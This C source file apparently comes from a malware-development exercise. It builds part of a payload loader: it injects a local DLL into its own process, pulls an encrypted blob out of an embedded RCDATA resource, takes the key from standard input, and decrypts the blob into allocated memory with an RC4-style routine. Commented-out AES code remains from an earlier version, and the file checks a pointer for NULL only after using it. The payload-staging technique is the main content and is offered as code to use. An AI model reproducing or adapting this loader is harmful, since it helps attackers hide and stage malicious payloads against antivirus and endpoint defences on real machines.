#include "rsrcPayloadTest.h"

PBYTE Test(int argc, char *argv[])
{
	//if (argc < 2) { printf("No Dll Injected :(\n"); return NULL; }
	printf("[!] injecting \".\\DLL.dll\" To the local Process of Pid: %d\n[+] Loading Dll...\n", GetCurrentProcessId());
	
	
	HMODULE hLibrary = LoadLibraryA(".\\DLL.dll");
		if (!hLibrary) { //printf("[x] Failed!\n"); 
			return NULL; 
		}
	
	//printf("[i] Successful!\n");
	//UCHAR    pKey[KEYSIZE];
	//UCHAR    pInitVec[IVSIZE];
	//UCHAR    pInitVecCopy[IVSIZE];
	RESOURCE resource;
	
	if (!FetchResource(&resource)) { return NULL; }
	
	Context context_t;
	
	unsigned char key[256] = { '\0' };
	
	fgets(key, 255, stdin);

	size_t sKey = strlen(key);

	//context_t.pKey = key;

	rInit(&context_t, key, sKey);

	/*
	srand(time(NULL));
	GenerateRandomBytes(pKey, KEYSIZE);
	
	srand(time(NULL) ^ pKey[0]);            
	GenerateRandomBytes(pInitVec, IVSIZE);
	
	memcpy(pInitVecCopy, pInitVec, IVSIZE);
	
	StatusCheck(pInitVecCopy, pKey, resource.pAddress, resource.sSize,"Resource");

	//PUCHAR rsrcText = malloc(resource.sSize);
	//if (!rsrcText) return NULL;
	//memcpy(rsrcText, resource.pAddress, resource.sSize);


	PUCHAR pCipherText;
	DWORD  sChiperText;

	//if (!aInit(rsrcText, resource.sSize, pKey, pInitVecCopy, &pCipherText, &sChiperText)) { free(rsrcText); return NULL; }
	
	//free(rsrcText);

	//StatusCheck(pInitVecCopy, pKey, pCipherText, sChiperText,"CipherText");
	
	//printf("[i] Heap Address: 0x%p\n[!] Encrypted!\n", pCipherText);

	PUCHAR pPlainText = malloc(sChiperText);
	DWORD  sPlainText = NULL;

	memcpy(pInitVecCopy, pInitVec, IVSIZE);

	aFin(pCipherText, sChiperText, pKey, pInitVecCopy, &pPlainText, &sPlainText);

	StatusCheck(pInitVecCopy, pKey, pPlainText, sPlainText, "PlainText");
	*/
	LPTEXT Text = HeapAlloc(GetProcessHeap(), 0, sizeof(TEXT));
	
	Text->sText = resource.sSize;

	Text->pText = VirtualAlloc(0, Text->sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);  
	
	rFin(&context_t, resource.pAddress, Text->pText, Text->sText);

	//printf("[i] Result: %s\n[i] Heap Address: 0x%p\n[!] Decrypted!\n", Text->pText, Text->pText);
	
	if (Text == NULL) { VirtualFree(Text->pText, Text->sText, MEM_FREE); HeapFree(GetProcessHeap(), 0,Text);  return NULL;
	}
	
	return Text;
}


BOOL FetchResource(
	OUT PRESOURCE pResource_t
)
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (!hRsrc) {
		//printf("[X] FindResourceW Failed With Error Code: %x\n", GetLastError());
		return FALSE;
	}

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (!hGlobal) { 
		//printf("[X] LoadResource Failed With Error Code: %x\n", GetLastError());
		return FALSE; 
	}

	pResource_t->pAddress = LockResource(hGlobal);
	if (!pResource_t->pAddress) {
		//printf("LockResource [X] Failed With Error Code: %x\n", GetLastError()); 
		return FALSE; 
	}

	pResource_t->sSize = SizeofResource(NULL, hRsrc);
	if (!pResource_t->sSize) { 
		//printf("[X] SizeofResource Failed With Error Code: %x\n", GetLastError()); 
		return FALSE; 
	}
	
	return TRUE;
}

VOID StatusCheck(
	IN PUCHAR pInitVec, 
	IN PUCHAR pKey,
	IN PUCHAR pData,
	IN size_t sData,
	IN PCHAR pName 
) {	
	PrintHexData("InitVec", pInitVec, IVSIZE);
	PrintHexData("Key", pKey, KEYSIZE);
	PrintHexData(pName, pData, sData);
}